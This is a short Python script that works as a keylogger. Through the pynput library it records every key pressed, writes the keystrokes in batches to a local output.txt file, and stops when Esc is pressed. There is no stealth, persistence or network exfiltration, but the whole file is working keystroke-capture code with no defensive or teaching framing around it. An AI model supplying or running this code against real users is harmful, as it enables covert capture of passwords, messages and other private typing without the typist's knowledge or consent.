from pynput import keyboard
from pynput.keyboard import Key, KeyCode

count = 0
keyCache = []
file = open('output.txt', 'a')


def handle_press(key):
    # print("{0} was pressed".format(key))
    global count, keyCache
    count = count + 1
    keyCache.append(key)

    if key == Key.esc:
        write_to_file(keyCache)
        return False

    if count >= 10:
        write_to_file(keyCache)
        keyCache = []
        count = 0


def handle_release(key):
    pass


def write_to_file(keys):
    found_space = False

    for key in keys:
        key_str = str(key)

        # print("{0} in write".format(key_str))

        if key_str.find('space') > -1:

            if found_space is False:
                file.write('\n')
                found_space = True

        elif key_str.find('Key.') == -1:
            file.write(key_str.replace("'", ""))
            found_space = False

        else:
            found_space = False
            file.write(key_str)


with keyboard.Listener(on_press=handle_press, on_release=handle_release) as aListener:
    aListener.join()

# Much uglier way to do it... you have to know that the enter gets called.
# aListener = keyboard.Listener(on_press=handle_press, on_release=handle_release).__enter__()
# aListener.join()




